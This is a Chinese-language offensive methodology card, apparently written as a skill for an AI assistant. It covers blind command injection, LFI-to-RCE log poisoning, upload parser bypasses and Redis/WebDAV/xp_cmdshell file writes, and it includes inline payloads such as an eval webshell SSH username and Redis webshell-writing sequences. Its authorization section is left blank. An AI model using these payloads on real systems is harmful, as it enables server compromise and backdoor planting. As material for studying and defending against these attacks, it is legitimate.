# 命令执行与文件落地：从「能跑一条命令」到「文件落在哪、怎么被执行」

## R — 原文 (Reading)

> "In general, the most reliable way to detect whether command injection is possible is to use time-delay inference in a similar way as was described for exploiting blind SQL injection."
>
> 译：总体而言，检测命令注入是否可行的最可靠方式，是采用与盲注 SQL 类似的时间延迟推断。

> — 《The Web Application Hacker's Handbook》Ch10 / Finding OS Command Injection Flaws

> "The reason why this test is effective, even if the subdirectory 'bar' does not exist, is that most common filesystems perform canonicalization of the file path before attempting to retrieve it."
>
> 译：这个测试之所以有效——即使子目录 bar 并不存在——是因为多数文件系统在取文件前会对路径做规范化。

> — 同上 / Detecting Path Traversal Vulnerabilities

> "虽然两边都是要将查询字符串中指定的名字显示在页面上，但两个浏览器上都显示了 tanaka 这个名字。这种现象被称为他人问题。"
>
> — 《Web 应用安全权威指南》4.15.1（用于说明"文件/共享状态"类落地点的共性）

## I — 方法论骨架 (Interpretation)

这个能力处理的是「服务端执行面」的一条完整链：**输入 → 解释器（shell / 语言 eval / include / 容器方法）→ 命令或文件操作 → 结果落在哪 → 怎么把结果拿回来**。它与 `injection-channel-selection` 的区别在于：那条链的终点是数据库，这条链的终点是操作系统与文件系统，因此「回显」往往彻底消失，必须靠副作用（时间、文件、连接）来判断。

四个判断层，逐层收敛：

1. **解释器是谁**。OS shell（分隔符 `; | &`、换行、`` ` ``）、语言 `eval`/`Execute()`（分隔符 `;`，先注入语言 API 再由此调 OS）、`include()`/`require()`（包含点即执行点）、容器方法（WebDAV `PUT`/`MOVE`、Redis `save`）。判错解释器会得到「payload 全部无效」的假结论。
2. **回显还在不在**。命令注入的回显常被吞掉（批处理、无输出重定向），所以「时间延迟」是最可靠的初判：`ping` 自己回环地址制造 N 秒延迟，Windows/UNIX 只是参数写法不同（`-n`/`-i`）。判据不是「慢了一次」，而是「改变延迟数值 → 延迟量随之变化」。
3. **降级路径**。分隔符被过滤不等于不能执行：`<`/`>` 仍可用时把输出重定向进 Web 根；能追加命令行参数时改变原程序行为（`wget -O 目标路径`）；空格被过滤时用 `$IFS`。
4. **文件落地点的三要素**：路径可知（能读到配置或已知绝对路径）、内容可控（UA/用户名/文件名/上传内容）、可被执行或被读取（目录在 web 根内、容器按该扩展名解析、或有包含点）。

「能不能 getshell」不是一个是非题，而是「路径确定性 × 内容可控性 × 执行条件」三者的乘积。任何一项为 0，整条路走不通，应换通道而不是继续变形 payload。

## A1 — 应用示例 (Application Example)

### 示例 1: ping 延迟确认命令注入，再用重定向落地
- **类型与来源**: 【亲历】《The Web Application Hacker's Handbook》Ch10（nslookup 场景）
- **问题/输入**: 一个把用户输入拼进系统命令的功能（`nslookup`），回显被吞掉，分隔符 `;` 被过滤。
- **方法论的使用**: ① 对参数依次提交 `| ping -i 30 127.0.0.1 |`、`& ping -n 30 127.0.0.1 &`、`; ping 127.0.0.1 ;`、`%0a ping ... %0a` 等，逐一计时；② 出现延迟后改变 `-n`/`-i` 数值，确认延迟随参数变化（排除网络抖动）；③ 分隔符全被过滤，但 `>` 可用 → 构造 `nslookup "[script code]" > [/path/to/executable_file]`；④ 输出 `** server can't find [script code]: NXDOMAIN` 被重定向写入可执行目录，访问该文件即执行。
- **结论**: 「不能插入第二条命令」不等于「不能执行」——改写原命令的行为（重定向、追加参数）同样能达到目的。
- **结果**: 原书以该场景说明元字符被挡后的降级路径，并给出落地文件被执行的完整链。

### 示例 2: 文件包含从「读文件」升级到 RCE
- **类型与来源**: 【亲历】《163酒仙桥六号部队__150-PHP文件包含小总结》
- **问题/输入**: 一个 `?file=` 参数可包含文件，先验证 `../../../../../../etc/passwd` 能读出。
- **方法论的使用**: ① 确认包含成立（能读 `/etc/passwd`）；② 按「路径确定性」排序试通道：session（路径可从 phpinfo 读）→ 访问日志（路径固定，内容由 UA 可控）→ SSH 日志（`/var/log/auth.log`，内容由登录名可控）→ `/proc/self/environ`（需 CGI 模式）；③ 默认日志路径连续 `no such file` 后，改读中间件配置确认日志真实位置；④ 最终用 `ssh '<?=eval($_REQUEST[1])?>'@remotehost` 把 payload 写进 `auth.log`，再包含该文件。
- **结论**: 包含本身只是「能读文件」，要变 RCE 必须有「内容可控 + 路径可知」的文件；默认路径假设不可靠。
- **结果**: 作者用 SSH 日志包含成功执行 PHP 代码。

### 示例 3: 多后缀与解析器回退
- **类型与来源**: 【例题】《Web 中间件常见漏洞总结》Apache 解析漏洞 / Nginx 配置错误
- **问题/输入**: 上传点只允许 `.jpg`，上传目录可执行脚本。
- **方法论的使用**: ① 判定容器与解析模式（IIS6 / IIS7+FastCGI / Apache+mod_php / Nginx+php-fpm）；② Apache 默认一个文件可有多个点分后缀，最右后缀不认识就往左识别 → 上传 `shell.php.xxx`（未知后缀）被当 PHP 执行；若配置了 `AddHandler application/x-httpd-php .php`，`shell.php.jpg` 也解析；③ Nginx 依赖 `cgi.fix_pathinfo=1`：上传图片马，访问 `info.jpg/xxx.php` 触发解析；④ IIS6 用 `shell.asp;.jpg` 或放进 `xxx.asp/` 目录；IIS7 FastCGI 访问 `shell.jpg/.php`。
- **结论**: 上传白名单校验「最后一个后缀」，容器解析「第一个能识别的后缀」，两者语义差就是绕过空间。
- **结果**: 原书逐条给出可复现的文件名构造与观察方法（`ORIG_SCRIPT_FILENAME` 等）。

### 示例 4: Redis 未授权写文件的四条路径
- **类型与来源**: 【亲历】《163酒仙桥六号部队__065-NoSql数据库之漏洞利用方法总结》
- **问题/输入**: 6379 端口可未授权连接，`config get dir` 有返回。
- **方法论的使用**: ① 按「已掌握的信息」选路径，而不是按「哪个最酷」：知道 web 绝对路径 → `config set dir <webroot>` + `dbfilename shell.php` + `set x "<?php ...?>"` + `save`；知道跑 root 且可写 ssh → 写 `authorized_keys`；要稳定回连 → 写 `/var/spool/cron/`；什么都不知道 → 主从复制加载恶意 `module.so`。
- **结论**: Redis 的 `save` 把「写文件」拆成 `dir` + `dbfilename` 两个可配置项，任意组合都能落盘；选择依据是信息完整度。
- **结果**: 作者在自建 4.0.9 上逐条演示四法。

## A2 — 触发场景 (Future Trigger) ★

### 用户会在什么情境下需要它
1. 某功能疑似调用外部命令（图片处理、PDF 转换、ping/nslookup、备份导出），但页面不回显任何东西。
2. 参数里出现 `?page=`、`?lang=`、`?template=`，怀疑文件包含。
3. 上传点只允许图片，想知道「图片马怎么被执行」。
4. 拿到了 Redis/数据库未授权，需要判断「能写哪、写完怎么执行」。
5. 已经能执行 PHP 代码但系统命令跑不了（转 `waf-bypass-encoding` 的 `disable_functions` 节）。
6. 注入执行了命令但看不到结果，需要一条稳定的取回通道。

### 语言信号（出现这些就该激活）
- 中文：「命令注入怎么确认」「ping 延迟」「无回显命令执行」「文件包含能不能 getshell」「?page= 能不能读文件」「图片马怎么执行」「redis 未授权怎么拿 shell」「上传被后缀白名单拦了」
- English: "command injection blind", "time delay ping", "LFI to RCE", "log poisoning include", "extension bypass", "path info parsing", "redis unauthorized getshell", "argument injection"

### 与相邻能力的区分
- 与 `injection-channel-selection` 的区别：解释器不同（OS/语言/包含 vs 数据库），探测串不可混用。
- 与 `server-request-injection` 的区别：那张卡的载荷是 URL / XML / 换行符（让服务器去请求或改写消息结构），本卡的载荷是可执行代码或命令。
- 与 `deserialization-rce` 的区别：本卡从「输入直接进解释器」进入；那张卡从「字节流被反序列化」进入。两者常在同一个 getshell 目标上接力。
- 与 `waf-bypass-encoding` 的区别：本卡假设载荷能到达 sink；被设备拦住时先转那张卡。

## E — 可执行步骤 (Execution)

**必需输入**: 可疑功能点与其参数；一个可控的回连/落地位置（自建 HTTP、DNS、可访问目录）；对目标 OS 与容器的初步判断（决定分隔符与路径写法）。缺「落地位置」时，先只做时间延迟判定，不急着上传。

**交付物与完成标准**: 一条「入口 → 解释器 → 执行证据 → 结果取回方式」的记录；完成标准是存在可重复的副作用（延迟随参数变化 / 文件可被 HTTP 读到 / 回连被收到）。

1. **判解释器与传输方式**
   - 做什么：看功能语义（图片转换→OS 命令；模板/语言渲染→eval；`?page=`→include；`OPTIONS` 有 PUT→WebDAV）；同时确认参数是 URL、body 还是 multipart。
   - 完成标准：能写出一句「这个输入最终进入 X 解释器的 Y 位置」。
   - 判停：若确认是数据库，转 `injection-channel-selection`。

2. **时间延迟初判（OS 命令）**
   - 做什么：对每个可疑参数依次提交 `| ping –i 30 127.0.0.1 |`、`| ping –n 30 127.0.0.1 |`、`& ping –i 30 ... &`、`& ping –n 30 ... &`、`; ping 127.0.0.1 ;`、`%0a ping ... %0a`、`` ` ping 127.0.0.1 ` ``，逐一计时。
   - 完成标准：某种分隔符导致稳定延迟，且**改变延迟数值时延迟量随之变化**。
   - 判停：全部无延迟 → 可能不是 shell，转第 3 步（eval）或第 5 步（包含）；只有一种分隔符有效时，仍要把其他元字符各试一次（应用可能调用另一台主机上的解释器）。

3. **eval / 动态执行判据**
   - 做什么：提交 `;echo 111111`、`echo 111111`、`response.write 111111`；判据是「111111 单独出现（前面没有原命令串残留）」；PHP 环境提交 `phpinfo()`；再用 `system('ping 127.0.0.1')` 做时间复核。
   - 完成标准：能证明「插入了一条独立语句」而不是「输入被回显」。
   - 判停：分号在 CGI 里是参数分隔符，必须写 `%3b`；回显被 HTML 转义时看起来像失败，实际可能已执行。

4. **降级利用（元字符被过滤）**
   - 做什么：先测 `<`/`>` 是否可用 → 把输出重定向进 web 根可执行目录；再测能否追加命令行参数（`wget -O 目标路径`、`curl -o`、`ffmpeg` 的输出参数）；空格被过滤且 UNIX 时用 `$IFS`。
   - 完成标准：目标路径出现受控内容且被解释执行（或至少能被 HTTP 读到）。
   - 判停：目标目录不可写、扩展名不被容器解析时，本路失败，转第 6 步（包含/上传）。

5. **文件包含：先证明读，再证明执行**
   - 做什么：① RFI：每个参数提交 `http://<你的服务器>/x`，看自己日志是否出现目标 IP；无请求时用不存在 IP 的 URL 触发超时（响应变慢也算证据）；② LFI：提交服务器上已知可执行资源名（页面结构变化=被包含执行）、已知静态资源名（内容原样出现在响应=可读）；③ 用穿越序列扩大范围。
   - 完成标准：能区分「能读」与「被执行」两个层级。
   - 判停：应用自动加后缀（`.php`）时远程 URL 会失效，改试「上传图片马 + 包含」或日志包含。

6. **落地通道选择（按路径确定性排序）**
   - 做什么：session（路径可从 phpinfo 读）→ 访问日志（路径固定，UA/URL 可控）→ SSH 日志（登录名可控）→ `/proc/self/environ`（需 CGI）→ `phpinfo` 临时文件（需条件竞争）→ 上传点（路径已知、无需竞争）。默认路径失败时先读 `httpd.conf`/`nginx.conf` 确认真实位置。
   - 完成标准：找到一组「路径确定 + 内容可控」的组合，且包含/访问后被解释执行。
   - 判停：直接发请求时符号被编码导致包含失败，改用代理截包改原始字节。

7. **容器/服务层写文件（WebDAV / Redis / 数据库）**
   - 做什么：WebDAV 对每个目录发 `OPTIONS` 记录方法（并手工实测，声明常与实际不符）→ `PUT` 无害文件确认可写 → `PUT` 后门 → 扩展名被挡时先 `PUT` 成 `.txt` 再用 `MOVE` 改名；Redis 按第 4 步示例的四条路径选；SQL Server 高权限时 `xp_cmdshell 'whoami > <绝对路径>\temp.txt'` 后 HTTP 读回。
   - 完成标准：文件可被 HTTP 访问且被容器解析（或结果文件可读回）。
   - 判停：`PUT` 成功但目录不解析脚本 → 改传 `.html`（打其他用户 XSS）或 `.jar`；Redis 写密钥后连不上，先确认 SSH 端口是否对外开放。

8. **取回结果并收敛**
   - 做什么：优先直连回显；其次写文件后 HTTP 读；再次带外（DNS/HTTP/SMB）；最后盲写 + 事后读取。同时 `whoami`/`id` 确认权限，再决定是否进入提权。
   - 完成标准：拿到一条可复现的命令输出或文件内容。
   - 判停：所有通道都不通时，回到第 2 步确认「命令真的执行了」——很多「打不通」其实是执行点判断错误。

## B — 边界 (Boundary) ★

### 不要用的情况
- 目标使用参数数组调用外部命令（不经 shell）且做了白名单：`;`/`|` 根本不会被解释，别在元字符上耗时间。
- 上传目录已配置为禁止执行脚本（`php_admin_flag engine off`、`RemoveHandler`）：所有「多后缀/解析回退」全部失效，这是正解修复而非可绕过项。
- 文件包含但 `open_basedir` 已限制到目标目录之外、且无 session/日志可写：包含链基本走不通。
- Redis/数据库未授权但目录全不可写、无主从复制条件：不要反复 `save`，换目标。

### 已知失败模式
- **只试 `;`**：过滤了分号但放过 `|`/`&` 的场景很常见；必须逐个元字符单独试。
- **拿「服务器看起来是 Linux」决定分隔符**：应用可能调用另一台主机上的解释器（原书明确提醒）。
- **单次延迟下结论**：不改变延迟数值复核，会把网络抖动当注入。
- **默认日志路径假设**：原书作者连续 `no such file`，最终换通道才成功；应先读配置。
- **`$_FILES['file']['name']` 里的换行会被 PHP 自动去掉**：CVE-2017-15715 类文件名绕过在此场景不成立。
- **`PUT` 成功就以为拿到 shell**：目录不解析脚本时文件只是「躺在那儿」。
- **SSRF/Redis 场景先打后确认**：不确认端口开放、目录可写、路径已知就盲打，会把时间耗在不通的路上（原书 132 的三个坑：SSH 未开放、权限不够、无 web 绝对路径）。
- **`disable_functions` 场景误判「方法失效」**：每条绕过通道都有硬前提（COM 需 dll、LD_PRELOAD 需 `mail()` 未被禁、破壳需 bash ≤4.3），前提不满足时不是方法错。

### 作者与时代的局限
- `%00` 截断、IIS6 分号截断、`php://input` 包含等技巧依赖老版本 PHP/容器，现代环境多已失效；书中已注明部分，但仍需按目标版本验证。
- 「写 crontab/authorized_keys」依赖 Redis 以 root 运行，容器化部署后这一前提常不成立，主从复制才是更通用的路径。
- `xp_cmdshell` 默认开启是 SQL Server 2000 时代的事，现代默认关闭且需 sysadmin 显式启用。

### 容易混淆的方法
- **命令注入 vs 代码注入**：前者面向 shell（`; | &`），后者面向语言解释器（`;` + 语言 API）；同一参数可能两层都存在，需要分别验证。
- **路径穿越 vs 文件包含**：穿越的终态是「读/写任意文件」，包含的终态是「让解释器执行文件内容」；能读不等于能执行。
- **上传 XSS vs 上传 getshell**：前者目标是让其他用户的浏览器执行，后者是让服务器执行；同一上传点可能两者都成立，但判据完全不同（看 `Content-Type`/`Content-Disposition` vs 看容器解析）。

### 授权与合规边界
> 待补充（用户自行填写）
